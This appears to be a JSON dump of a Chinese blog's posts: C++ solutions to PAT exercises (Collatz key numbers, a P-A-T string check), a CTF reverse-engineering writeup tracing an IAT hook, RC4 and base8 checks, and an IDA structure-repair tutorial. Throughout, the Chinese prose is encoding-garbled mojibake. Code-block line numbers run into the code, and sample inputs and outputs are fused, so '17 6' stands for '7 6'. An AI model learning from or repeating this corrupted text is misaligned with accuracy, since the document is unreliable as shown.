i;&#125; ä½†å…¶å®è¿™åœ¨æ•ˆç‡ä¸Šå·®äº†ç‚¹ï¼Œifçš„ä¸¤ä¸¤ç§æƒ…å†µéƒ½è¦é™¤2ã€‚ çœ‹äº†æŸ³ç¥çš„è§£ç­”ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸¤ç§å¤„ç†è¿ç®—ä¸­æŠ½ç¦»å…±åŒè¿ç®— 123456789101112#include&lt;iostream&gt;using namespace std;int main()&#123; int n,i = 0; cin &gt;&gt; n; for(;n != 1;i++)&#123; if(n%2) n = (3*n + 1); n /= 2; &#125; cout &lt;&lt; i;&#125; åƒè¿™é¢˜é¢˜è§£ä¹Ÿä¸€æ · 1234for(int i=0;i&lt;tmp.size();i++)&#123; if(i!=0) cout &lt;&lt; &quot; &quot;; cout &lt;&lt; mp[tmp[i]-48]; &#125; æ¯ä¸€æ¬¡éƒ½ä¸ä¸€æ ·è¦æ‰“å°ç©ºæ ¼ï¼Œä½†æ¯æ¬¡å¿…é¡»è¦æ‰“å°æ•°å­—ã€‚å¯ä»¥åœ¨å¼€ç«¯æˆ–è€…æœ«å°¾è¿›è¡Œå—é™ã€‚ä½†æ˜¯åœ¨æœ«å°¾çš„è¯è¿˜è¦å†æ¬¡è®¡ç®—tmp.size()ï¼Œè¿™æ ·å°±è¦èŠ±é”€äº† é¢˜ç›®ä¸‰å¡æ‹‰å…¹(Callatz)çŒœæƒ³å·²ç»åœ¨1001ä¸­ç»™å‡ºäº†æè¿°ã€‚åœ¨è¿™ä¸ªé¢˜ç›®é‡Œï¼Œæƒ…å†µç¨å¾®æœ‰äº›å¤æ‚ã€‚ å½“æˆ‘ä»¬éªŒè¯å¡æ‹‰å…¹çŒœæƒ³çš„æ—¶å€™ï¼Œä¸ºäº†é¿å…é‡å¤è®¡ç®—ï¼Œå¯ä»¥è®°å½•ä¸‹é€’æ¨è¿‡ç¨‹ä¸­é‡åˆ°çš„æ¯ä¸€ä¸ªæ•°ã€‚ä¾‹å¦‚å¯¹ n&#x3D;3 è¿›è¡ŒéªŒè¯çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®— 3ã€5ã€8ã€4ã€2ã€1ï¼Œåˆ™å½“æˆ‘ä»¬å¯¹ n&#x3D;5ã€8ã€4ã€2 è¿›è¡ŒéªŒè¯çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥åˆ¤å®šå¡æ‹‰å…¹çŒœæƒ³çš„çœŸä¼ªï¼Œè€Œä¸éœ€è¦é‡å¤è®¡ç®—ï¼Œå› ä¸ºè¿™ 4 ä¸ªæ•°å·²ç»åœ¨éªŒè¯3çš„æ—¶å€™é‡åˆ°è¿‡äº†ï¼Œæˆ‘ä»¬ç§° 5ã€8ã€4ã€2 æ˜¯è¢« 3â€œè¦†ç›–â€çš„æ•°ã€‚æˆ‘ä»¬ç§°ä¸€ä¸ªæ•°åˆ—ä¸­çš„æŸä¸ªæ•° n ä¸ºâ€œå…³é”®æ•°â€ï¼Œå¦‚æœ n ä¸èƒ½è¢«æ•°åˆ—ä¸­çš„å…¶ä»–æ•°å­—æ‰€è¦†ç›–ã€‚ ç°åœ¨ç»™å®šä¸€ç³»åˆ—å¾…éªŒè¯çš„æ•°å­—ï¼Œæˆ‘ä»¬åªéœ€è¦éªŒè¯å…¶ä¸­çš„å‡ ä¸ªå…³é”®æ•°ï¼Œå°±å¯ä»¥ä¸å¿…å†é‡å¤éªŒè¯ä½™ä¸‹çš„æ•°å­—ã€‚ä½ çš„ä»»åŠ¡å°±æ˜¯æ‰¾å‡ºè¿™äº›å…³é”®æ•°å­—ï¼Œå¹¶æŒ‰ä»å¤§åˆ°å°çš„é¡ºåºè¾“å‡ºå®ƒä»¬ã€‚ è¾“å…¥æ ¼å¼ï¼šæ¯ä¸ªæµ‹è¯•è¾“å…¥åŒ…å« 1 ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œç¬¬ 1 è¡Œç»™å‡ºä¸€ä¸ªæ­£æ•´æ•° K (&lt;100)ï¼Œç¬¬ 2 è¡Œç»™å‡º K ä¸ªäº’ä¸ç›¸åŒçš„å¾…éªŒè¯çš„æ­£æ•´æ•° n (1&lt;nâ‰¤100)çš„å€¼ï¼Œæ•°å­—é—´ç”¨ç©ºæ ¼éš”å¼€ã€‚ è¾“å‡ºæ ¼å¼ï¼šæ¯ä¸ªæµ‹è¯•ç”¨ä¾‹çš„è¾“å‡ºå ä¸€è¡Œï¼ŒæŒ‰ä»å¤§åˆ°å°çš„é¡ºåºè¾“å‡ºå…³é”®æ•°å­—ã€‚æ•°å­—é—´ç”¨ 1 ä¸ªç©ºæ ¼éš”å¼€ï¼Œä½†ä¸€è¡Œä¸­æœ€åä¸€ä¸ªæ•°å­—åæ²¡æœ‰ç©ºæ ¼ã€‚ è¾“å…¥æ ·ä¾‹ï¼š1263 5 6 7 8 11 è¾“å‡ºæ ·ä¾‹ï¼š17 6 è§£ç­”ï¼š è¿™é‡Œè¾“å…¥çš„æ•°ç”¨ä¸€ä¸ªæ•°ç»„è¿›è¡Œå­˜æ”¾ï¼› ç„¶åç”¨å¦å¤–çš„æ•°ç»„arrè¿›è¡Œè®°å½•nè¿ç®—è¿‡ç¨‹ä¸­å‡ºç°æŸäº›æ•°ï¼Œå‡ºç°è¿‡è®°å½•ä¸º1ï¼Œå…¶ä»–ä¸º0ï¼› ç„¶åè¿›è¡Œå­˜æ”¾æ•°æ®çš„æ•°ç»„è¿›è¡Œæ’åºï¼› ç„¶åéå†æ•°ç»„ï¼Œarrä¸º0çš„ä½ç½®è¾“å‡ºå³å¯ è¿™é‡Œè™½ç„¶æ•°nå°äº100ï¼Œä½†æ˜¯å¦‚æœæ˜¯99å°±ä¼šÃ—3+1ï¼Œå¿…ç„¶ä¼šå¤§äº100ï¼Œè¿™é‡Œarræ•°ç»„å°½å¯èƒ½åœ°å¤§ ç”±äºæ•°ç»„ä¸€éœ€è¦æ’åºï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ç”¨äº†vectorå®¹å™¨ è¿™é‡Œsortç”¨äº†lambdaè¡¨è¾¾å¼ï¼Œæ•ˆç‡ä¸çŸ¥é“æ€ä¹ˆæ ·ï¼Œå¤Ÿå¸…å°±è¡Œå“ˆå“ˆ ç„¶åå°±æ˜¯è¾“å‡ºäº†ï¼Œè¿™é‡Œæ¯æ¬¡å› ä¸ºä¸ä¸€å®šä¼šè¾“å‡ºæ•°ï¼Œä¹Ÿä¸ä¸€å®šä¼šè¾“å‡ºç©ºæ ¼ï¼Œæ‰€ä»¥æ²¡æœ‰å…¬å…±éƒ¨åˆ†ï¼Œåªèƒ½ç”¨ifè¿‡æ»¤äº† è¿™é‡Œç”¨äº†ä¸€ä¸ªflagæ¥è®°å½•æ˜¯å¦è¾“å‡ºç©ºæ ¼ï¼Œè¿˜æ˜¯é‡‡ç”¨â€œ â€+æ•°çš„å½¢å¼ 123456789101112131415161718192021222324252627282930#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;int arr[100000];int main(void)&#123; int n,tmp,k; cin &gt;&gt; k; vector&lt;int&gt; v(k); for(int i=0;i&lt;k;i++)&#123; cin &gt;&gt; n; v[i] = n; for(;n != 1;)&#123; if(n%2) n = (3*n + 1); n /= 2; if(arr[n]==1) break; arr[n] = 1; &#125; &#125; sort(v.begin(),v.end(),[](int a,int b)&#123;return a &gt; b;&#125;); for(int i=0,flag = 0;i&lt;k;i++)&#123; if(arr[v[i]] == 0) &#123; if(flag) &#123; cout &lt;&lt; &quot; &quot;;&#125; cout &lt;&lt; v[i]; flag = 1; &#125; &#125; return 0;&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"mapé¢˜è§£å­—ç¬¦ä¸²é—®é¢˜","slug":"mapé¢˜è§£å­—ç¬¦ä¸²é—®é¢˜","date":"2023-05-07T11:33:37.000Z","updated":"2023-05-07T11:55:54.090Z","comments":true,"path":"2023/05/07/mapé¢˜è§£å­—ç¬¦ä¸²é—®é¢˜/","link":"","permalink":"https://pa1r0t.github.io/2023/05/07/map%E9%A2%98%E8%A7%A3%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/","excerpt":"PAT_basic C++ map1","text":"PAT_basic C++ map1 PATä¹™çº§1003. æˆ‘è¦é€šè¿‡ï¼â€‹ æ­¤é¢˜ï¼Œé¢˜ç›®å°±éš¾ä»¥ç†è§£ã€‚ä¸è¿‡ç°åœ¨ç†è§£äº†ï¼Œé¢˜ç›®å…¶å®æˆ‘è§‰å¾—æ¡ä»¶äºŒè¦åœ¨æ¡ä»¶ä¸€çš„åŸºç¡€ä¸Šç†è§£ï¼Œç„¶åæ¡ä»¶ä¸‰è¦åœ¨æ¡ä»¶äºŒçš„åŸºç¡€ä¸Šç†è§£ï¼Œç„¶åéœ€è¦ç»™å‡ºä¾‹å­è¿›è¡Œæ¨å¯¼ï¼Œç„¶åæ€»ç»“å‡ºç»“è®ºâ€”â€”å…¶å®å°±æ˜¯æ€»ç»“å‡ºå…¬å¼ é¢˜ç›®ï¼š â€œç­”æ¡ˆæ­£ç¡®â€æ˜¯è‡ªåŠ¨åˆ¤é¢˜ç³»ç»Ÿç»™å‡ºçš„æœ€ä»¤äººæ¬¢å–œçš„å›å¤ã€‚æœ¬é¢˜å±äº PAT çš„â€œç­”æ¡ˆæ­£ç¡®â€å¤§æ´¾é€ â€”â€” åªè¦è¯»å…¥çš„å­—ç¬¦ä¸²æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼Œç³»ç»Ÿå°±è¾“å‡ºâ€œç­”æ¡ˆæ­£ç¡®â€ï¼Œå¦åˆ™è¾“å‡ºâ€œç­”æ¡ˆé”™è¯¯â€ã€‚ å¾—åˆ°â€œç­”æ¡ˆæ­£ç¡®â€çš„æ¡ä»¶æ˜¯ï¼š å­—ç¬¦ä¸²ä¸­å¿…é¡»ä»…æœ‰ Pã€ Aã€ Tè¿™ä¸‰ç§å­—ç¬¦ï¼Œä¸å¯ä»¥åŒ…å«å…¶å®ƒå­—ç¬¦ï¼› ä»»æ„å½¢å¦‚ xPATx çš„å­—ç¬¦ä¸²éƒ½å¯ä»¥è·å¾—â€œç­”æ¡ˆæ­£ç¡®â€ï¼Œå…¶ä¸­ x æˆ–è€…æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œæˆ–è€…æ˜¯ä»…ç”±å­—æ¯ A ç»„æˆçš„å­—ç¬¦ä¸²ï¼› å¦‚æœ aPbTc æ˜¯æ­£ç¡®çš„ï¼Œé‚£ä¹ˆ aPbATca ä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œå…¶ä¸­ aã€ bã€ c å‡æˆ–è€…æ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œæˆ–è€…æ˜¯ä»…ç”±å­—æ¯ A ç»„æˆçš„å­—ç¬¦ä¸²ã€‚ ç°åœ¨å°±è¯·ä½ ä¸º PAT å†™ä¸€ä¸ªè‡ªåŠ¨è£åˆ¤ç¨‹åºï¼Œåˆ¤å®šå“ªäº›å­—ç¬¦ä¸²æ˜¯å¯ä»¥è·å¾—â€œç­”æ¡ˆæ­£ç¡®â€çš„ã€‚ è¾“å…¥æ ¼å¼ï¼šæ¯ä¸ªæµ‹è¯•è¾“å…¥åŒ…å« 1 ä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚ç¬¬ 1 è¡Œç»™å‡ºä¸€ä¸ªæ­£æ•´æ•° n (â‰¤10)ï¼Œæ˜¯éœ€è¦æ£€æµ‹çš„å­—ç¬¦ä¸²ä¸ªæ•°ã€‚æ¥ä¸‹æ¥æ¯ä¸ªå­—ç¬¦ä¸²å ä¸€è¡Œï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¸è¶…è¿‡ 100ï¼Œä¸”ä¸åŒ…å«ç©ºæ ¼ã€‚ è¾“å‡ºæ ¼å¼ï¼šæ¯ä¸ªå­—ç¬¦ä¸²çš„æ£€æµ‹ç»“æœå ä¸€è¡Œï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²å¯ä»¥è·å¾—â€œç­”æ¡ˆæ­£ç¡®â€ï¼Œåˆ™è¾“å‡º YESï¼Œå¦åˆ™è¾“å‡º NOã€‚ è¾“å…¥æ ·ä¾‹ï¼š123456789101110PATPAATAAPATAAAAPAATAAAAxPATxPTWhateverAPAAATAAAPTAPATTAA è¾“å‡ºæ ·ä¾‹ï¼š12345678910YESYESYESYESNONONONONONO é¢˜è§£ï¼š 123456789101112131415161718192021222324252627282930#include&lt;iostream&gt;#include&lt;map&gt;using namespace std;int main(void)&#123; int n; string s; int p=-1,t=-1; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; s; map&lt;char,int&gt; mp; //éå†å­—ç¬¦ä¸² for(int j=0;j&lt;s.size();j++)&#123; //è®°å½•å­—ç¬¦æ•°é‡ mp[s[j]]++; //è®°å½•P,Tçš„ä½ç½® if(s[j] == &#x27;P&#x27;) p = j; if(s[j] == &#x27;T&#x27;) t = j; &#125; //mp[&#x27;A&#x27;] != 0 å¿…é¡»è¦æœ‰Aå­—ç¬¦ //mp[&#x27;P&#x27;] == 1 &amp;&amp; mp[&#x27;T&#x27;] == 1 PTå­—ç¬¦å¿…é¡»è¦æœ‰ä¸”æœ‰ä¸€ä¸ª //t-p &gt; 1 På’ŒTçš„ä½ç½®æ»¡è¶³ä¸­é—´ä¸€ä¸ªè·ç¦»ï¼Œå³ä¸­é—´å¿…é¡»æœ‰A //mp.size() == 3 ä»…æœ‰P A T //p*(t-p-1)==s.size()-t-1 å‰Aæ•°é‡ Ã—ä¸­é—´Aæ•°é‡ = åAæ•°é‡ if(mp[&#x27;A&#x27;] != 0 &amp;&amp; mp[&#x27;P&#x27;] == 1 &amp;&amp; mp[&#x27;T&#x27;] == 1 &amp;&amp; t-p != 1 &amp;&amp; mp.size() == 3 &amp;&amp; p*(t-p-1)==s.size()-t-1) printf(&quot;YES\\n&quot;); else printf(&quot;NO\\n&quot;); &#125;&#125; è¿™é¢˜æœ¬æ¥æ˜¯è¦è®¡ç®—å­—ç¬¦Aä½ç½®ä¸Šæ•°é‡çº¦æŸï¼Œä¸€ä¸ªmapå°±å·§å¦™è§£å†³äº†æ‰€æœ‰çº¦æŸå¤ªå¦™äº†ã€‚ ç”³æ˜ï¼šæ­¤é¢˜ä¸»è¦çœ‹æŸ³ç¥è§£ç­”ï¼Œéæœ¬äººç‹¬åˆ› å‚è€ƒé“¾æ¥ï¼š1003. æˆ‘è¦é€šè¿‡ï¼(20)-PATä¹™çº§çœŸé¢˜ â€“ æŸ³å©¼ ã® blog (liuchuo.net)","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"è¥¿æ¹–è®ºå‰‘wp","slug":"è¥¿æ¹–è®ºå‰‘wp","date":"2023-02-15T02:06:30.000Z","updated":"2023-05-07T12:03:57.090Z","comments":true,"path":"2023/02/15/è¥¿æ¹–è®ºå‰‘wp/","link":"","permalink":"https://pa1r0t.github.io/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/","excerpt":"è¥¿æ¹–è®ºå‰‘wp","text":"è¥¿æ¹–è®ºå‰‘wp BabyREç»™æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°éƒ½è®¾ç½®æ–­ç‚¹ å¼€å§‹åŠ¨è°ƒï¼Œç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œç»™è¾“å…¥çš„å€¼è¿›è¡Œæ£€éªŒæ˜¯å¦æ˜¯æ•°å­— ç¬¬äºŒä¸ªå‡½æ•°è¿›è¡ŒæŒ‰ä½å–å å–ååçš„ç»“æœ ä¸‹ä¸ªå‡½æ•°æ˜¯IAT hook .æ›¿æ¢GetLastErrorå‡½æ•° æ›¿æ¢ä¸ºsub_4019D0å‡½æ•° GetModuleHandleå‡½æ•°ï¼šè·å–ä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–åŠ¨æ€é“¾æ¥åº“çš„æ¨¡å—å¥æŸ„ GetModuleHandleA(0);è¿”å›0x00400000ï¼Œè€Œ*æ¨¡å—å¥æŸ„å®é™…ä¸Šå°±æ˜¯æ¨¡å—åœ¨å½“å‰è¿›ç¨‹ç©ºé—´çš„è£…å…¥åœ°å€ã€‚exeç¨‹åºè£…å…¥å¥æŸ„ä¸€èˆ¬ä¸º 0x00400000 ã€‚æ‰€ä»¥GetModuleHandle(NULL); è¿”å›çš„å€¼ä¸º 0x00400000ï¼›GetModuleHandle(â€œkernel32â€)ï¼›è¿”å›å€¼æ˜¯0x7c800000(è¿™ä¸ªå€¼æ­£æ˜¯kernel32.dllä¸­çš„Image baseçš„å€¼)ã€‚* è¿™é‡ŒlpModuleNameä¸ºkernel32 ç„¶ååœ¨kernel32æ¨¡å—ä¸­æ‰¾GetLastErrorå‡½æ•°åœ°å€å†å°†å…¶æ›¿æ¢è¿™å°±æ˜¯hook IATçš„è¿‡ç¨‹ï¼šå…ˆä»ç¨‹åºå¥æŸ„0x00400000ä¸­æ‰¾kernel32.dllå†ä»kernel32ä¸­æ‰¾getlasterrorã€‚åˆšå¥½ä¸¤ä¸ªå¾ªç¯ è¿™é‡ŒåŒå‡»ä¹Ÿå¯ä»¥æŸ¥çœ‹ å†ç»™æ›¿æ¢çš„å‡½æ•°åŠ ä¸Šæ–­ç‚¹ æ³¨æ„dword_4085C0æ˜¯IATä¹‹åçš„GetLastErrorå‡½æ•° ä¸‹ä¸€ä¸ªå‡½æ•°æ˜¯æ›¿æ¢dword_408148çš„å€¼ C åº“å‡½æ•° int atexit(void (*func)(void)) å½“ç¨‹åºæ­£å¸¸ç»ˆæ­¢æ—¶ï¼Œè°ƒç”¨æŒ‡å®šçš„å‡½æ•° funcã€‚æ‚¨å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æ³¨å†Œä½ çš„ç»ˆæ­¢å‡½æ•°ï¼Œä½†å®ƒä¼šåœ¨ç¨‹åºç»ˆæ­¢çš„æ—¶å€™è¢«è°ƒç”¨ã€‚func â€“ åœ¨ç¨‹åºç»ˆæ­¢æ—¶è¢«è°ƒç”¨çš„å‡½æ•°ã€‚ å¦‚æœæœ‰å¤šå¤„atexité‚£ä¹ˆæ‰§è¡Œé¡ºåºæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ 12345678910111213141516171819202122232425262728293031#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void functionA ()&#123; printf(&quot;è¿™æ˜¯å‡½æ•°A\\n&quot;);&#125;void functionB ()&#123; printf(&quot;è¿™æ˜¯å‡½æ•°B\\n&quot;);&#125;void functionC ()&#123; printf(&quot;è¿™æ˜¯å‡½æ•°C\\n&quot;);&#125;int main ()&#123; /* æ³¨å†Œç»ˆæ­¢å‡½æ•° */ atexit(functionA ); printf(&quot;å¯åŠ¨ä¸»ç¨‹åº...\\n&quot;); atexit(functionC ); printf(&quot;é€€å‡ºä¸»ç¨‹åº...\\n&quot;); atexit(functionB ); return(0);&#125; å¯ä»¥çœ‹å‡ºæ¥å¤šå‡ºatexitæ˜¯ä»¥æ ˆçš„æ‰§è¡Œé¡ºåºè°ƒç”¨çš„ æ‰€ä»¥æ€»ç»“ä¸€ä¸‹æ‰§è¡Œé¡ºåº sub_401170 è¾“å…¥æ£€éªŒ -&gt; sub_401230 å¯¹æŸä¸€å†…å­˜æ•°æ®è¿›è¡ŒæŒ‰ä½å–å sub_4012B0 IAT hook æ›¿æ¢GetLastErrorå‡½æ•° æ›¿æ¢ä¸ºsub_4019D0å‡½æ•° main sub_4019D0 dword_408148, â€œdcbahgfelkjiponmâ€ sub_401670 base8 åŠ å¯†åmemcmp(&amp;unk_4081D0, a16230465152334, 0x60u); sub_4015C0 sub_401CC0åŠ å¯†åmemcmp(Buffer, a67339fc92b4875, 0x28u); sub_4014E0 æ‰§è¡ŒRC4ï¼Œåæ¯”è¾ƒå¯†æ–‡memcmp(&amp;unk_4084C0, &amp;unk_408090, 0x70u) ) ebpfç¨‹åºï¼šeBPF äº 2015 å¹´æ¨å‡ºï¼Œæ˜¯ Linux çš„ ä¸€é¡¹ åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥åœ¨ Linux å†…æ ¸ä¸­è¿è¡Œç¨‹åºï¼Œè€Œä¸æ˜¯åœ¨æ— æ³•ç›´æ¥è®¿é—®å†…æ ¸èµ„æºçš„â€œç”¨æˆ·ç©ºé—´â€ä¸­è¿è¡Œç¨‹åºã€‚ eBPF æºäº BPFï¼Œæœ¬è´¨ä¸Šæ˜¯å¤„äºå†…æ ¸ä¸­çš„ä¸€ä¸ªé«˜æ•ˆä¸çµæ´»çš„è™šç±»è™šæ‹Ÿæœºç»„ä»¶ï¼Œä»¥ä¸€ç§å®‰å…¨çš„æ–¹å¼åœ¨è®¸å¤šå†…æ ¸ Hook ç‚¹æ‰§è¡Œå­—èŠ‚ç ã€‚ èµ„æ–™é“¾æ¥ï¼š (61æ¡æ¶ˆæ¯) eBPF å…¥é—¨ä¹‹ç¼–ç¨‹_rtoaxçš„åšå®¢-CSDNåšå®¢_ebpfç¨‹åº (61æ¡æ¶ˆæ¯) eBPFåœ¨androidä¸Šçš„ä½¿ç”¨_å¸ƒé“å¸ˆPeterçš„åšå®¢-CSDNåšå®¢ VTæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ VTï¼Œå…¨ç§°æ˜¯ï¼ŒVirtualization Technologyï¼Œå³æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œè™šæ‹ŸåŒ–æŠ€æœ¯å¯ä»¥æ‰©å¤§ç¡¬ä»¶çš„å®¹é‡ï¼Œç®€åŒ–è½¯ä»¶çš„é‡æ–°é…ç½®è¿‡ç¨‹ã€‚CPUçš„è™šæ‹ŸåŒ–æŠ€æœ¯å¯ä»¥å•CPUæ¨¡æ‹Ÿå¤šCPUå¹¶è¡Œï¼Œå…è®¸ä¸€ä¸ªå¹³å°åŒæ—¶è¿è¡Œå¤šä¸ªæ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºéƒ½å¯ä»¥åœ¨ç›¸äº’ç‹¬ç«‹çš„ç©ºé—´å†…è¿è¡Œè€Œäº’ä¸å½±å“ï¼Œä»è€Œæ˜¾è‘—æé«˜è®¡ç®—æœºçš„å·¥ä½œæ•ˆç‡ã€‚ VTå®ç°ï¼šVT å…¥é—¨ç•ªå¤–ç¯‡â€”â€”æœ€å° VT å®ç° - å¯‚é™çš„ç¾½å¤ - åšå®¢å›­ (cnblogs.com)","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"IDAç»“æ„ä½“åˆ†æ","slug":"IDAç»“æ„ä½“åˆ†æ","date":"2023-01-21T01:52:17.000Z","updated":"2023-01-22T13:48:54.654Z","comments":true,"path":"2023/01/21/IDAç»“æ„ä½“åˆ†æ/","link":"","permalink":"https://pa1r0t.github.io/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/","excerpt":"IDA ç±»å‹ä¿®å¤","text":"IDA ç±»å‹ä¿®å¤ æºç ç¼–è¯‘æˆäºŒè¿›åˆ¶ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œå¤§é‡è¾…åŠ©ä¿¡æ¯è¢«åˆ é™¤ï¼Œå…¶ä¸­æœ€é‡è¦çš„å°±æ˜¯ç±»å‹ä¿¡æ¯ ä¸ºä»€ä¹ˆè¦ä¿®å¤ä¼ªä»£ç ä¸­çš„ç±»å‹ï¼Ÿ æé«˜ä¼ªä»£ç çš„å‡†ç¡®åº¦ æŒ‡å¯¼ IDA åç¼–è¯‘å™¨ä¸­çš„ä¼˜åŒ–å™¨ä½¿ç”¨æ­£ç¡®çš„ä¼˜åŒ–æ–¹æ¡ˆ è®© IDA ç”Ÿæˆçš„ä¼ªä»£ç æ›´æ¥è¿‘æºç  æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¿®å¤å“ªäº›ç±»å‹ï¼Ÿ å‡½æ•°è¿”å›å€¼ç±»å‹ å‚æ•°ç±»å‹ &#x2F; å±€éƒ¨å˜é‡ç±»å‹ &#x2F; å…¨å±€å˜é‡ç±»å‹ æ•°ç»„ç±»å‹ &#x2F; æ•°ç»„å¤§å° ç»“æ„ä½“ç±»å‹ è™šè¡¨ç±»å‹ IDA æ•°ç»„ä¿®å¤ä¸»è¦æœ‰ä¸¤ç§ï¼š 1.å±€éƒ¨å˜é‡ä¸­å®šä¹‰çš„æ•°ç»„ 2.å…¨å±€å˜é‡ä¸­å®šä¹‰çš„æ•°ç»„ æ•°ç»„ä¿®å¤è¦è€ƒè™‘ï¼šæ•°æ®ç±»å‹ + æ•°ç»„å¤§å° IDA ä¿®å¤æšä¸¾å€¼å®éªŒææ–™ï¼šptrace1 IDA çš„ç±»å‹æ•°æ®åº“å†…ç½®äº†å¸¸è§çš„æšä¸¾ï¼ˆå®ï¼‰çš„å€¼ï¼Œå¯ä»¥ç›´æ¥å¼•å…¥å¹¶ä¿®å¤ã€‚ é€šè¿‡é€†å‘åˆ†æï¼Œptraceå‡½æ•° ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ptraceå‡½æ•°çš„åŠŸèƒ½å· é¼ æ ‡é”å®šæ‘Mé”®å¯¼å…¥æšä¸¾å€¼ Ctrl+F5æœç´¢ptraceå…³é”®å­— æ‰¾åˆ°ååŒå‡»å³å¯ ä¸‹å›¾å°±å…¨éƒ¨ä¿®å¤å®Œæˆäº† IDA ç»“æ„ä½“ä¿®å¤å®éªŒææ–™ï¼šmonopoly è¿™æ˜¯ä¸€ä¸ªå¤§å¯Œç¿æ¸¸æˆï¼ ç¡®å®šç»“æ„ä½“å¤§å°ï¼š å†…å­˜åˆ†é…å¯ä»¥ç›´æ¥ç¡®å®šç»“æ„ä½“å¤§å° memcpy &#x2F; å±€éƒ¨å˜é‡åç§»å·® -&gt; é—´æ¥ç¡®å®š ï¼ˆç»“æ„ä½“&#x2F;ç±»å±€éƒ¨å˜é‡ï¼‰ è¿™ç§å¤§å¤šæ˜¯åœ¨æ ˆä¸Š åˆ›å»ºç›¸ç­‰å¤§å°åŒ¿åç»“æ„ä½“ï¼Œå¹¶å°†ç›¸å…³å˜é‡ã€å‚æ•°çš„ç±»å‹ä¿®æ”¹ä¸ºè¯¥ç»“æ„ä½“ è¿™é‡Œçœ‹è§è¿™ä¸ª0x70çš„newå‡½æ•°ï¼Œç›´æ¥åœ¨structè§†å›¾ä¸‹åˆ›å»ºç»“æ„ä½“ å¿«æ·é”®æ˜¯Shift + F9ï¼Œæ‰“å¼€structè§†å›¾ è¿™é‡Œåœ¨structè§†å›¾ä¸‹ï¼Œå³é”®ç‚¹å‡»å¢åŠ ç»“æ„ä½“ç±»å‹ è¿™é‡Œå¯ä»¥çœ‹è§ç»“æ„ä½“å¤§å° é¼ æ ‡å…‰æ ‡åœ¨endså¤„ï¼Œå¢åŠ å±æ€§ï¼ˆå¤§å°ï¼‰ï¼šæ‘dé”® è¿™é‡Œç›´åˆ°sizeofæ˜¾ç¤ºä¸º0x70ä¸ºæ­¢ï¼Œæ¯ä¸ªå±æ€§å…ˆä»¥dqä¸ºå•ä½ï¼Œè¿›è¡Œå­˜å‚¨ï¼Œåç»­å†é€†å‘åˆ†æå†è¿›è¡Œå˜æ›´ è¿™æ ·ç»“æ„ä½“å°±åˆæ­¥è®¾ç½®å®Œæˆäº† è¿™é‡Œå›åˆ°ä»£ç å¤„ï¼Œè¿™é‡Œå°†v0çš„ç±»å‹ä¿®æ”¹ä¸ºï¼Œåˆšåˆšæˆ‘ä»¬åˆ›å»ºçš„ç»“æ„ä½“ç±»å‹ ç¬¬ä¸€ç§æ”¹æ³•ï¼šæ‘Yé”®ï¼Œè¿›è¡Œç±»å‹ä¿®æ”¹ä¸ºstruc_1 *ç±»å‹ ç¬¬äºŒç§æ”¹æ³•ï¼šæ‘å³é”®ï¼Œè½¬åŒ–ä¸ºå…¶ä»–ç»“æ„ä½“ï¼š è¿™é‡Œç›´æ¥é€‰æ‹©æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„ç±»å‹å³å¯ è¿™é‡Œåˆ›å»ºå¥½ä¹‹åï¼Œæ‰§è¡Œä¸‹é¢çš„å‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹ è¿™é‡Œçš„a1è¿›è¡Œäº†ä¸€ç³»åˆ—æ“ä½œï¼Œæˆ‘ä»¬å°†a1çš„ç±»ä¿®ä¿®æ”¹ä¸ºæˆ‘ä»¬å®šä¹‰çš„ç±»å‹ å› ä¸ºè¿™ä¸ªå‡½æ•°åœ¨newä¹‹åæ‰§è¡Œï¼Œæ‰€ä»¥å¯èƒ½æ˜¯æ„é€ å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬æ”¹ä¸ªå‡½æ•°åå§ åœ¨æ„é€ å‡½æ•°ä¸­ï¼Œæœ‰äº›å±æ€§æ˜¯è¿›è¡Œdwordæ“ä½œï¼Œè¿™é‡Œæˆ‘ä»¬å°±è¦å°†qwordï¼Œæ”¹æˆdwordç±»å‹ æ¯”å¦‚field_48ï¼Œè¿™é‡ŒåŒå‡»field_48è¿›å…¥ç»“æ„ä½“å®šä¹‰å¤„ï¼Œå°†è¯¥å±æ€§æ”¹æˆdwordï¼Œè¿™é‡Œæ‘dé”® 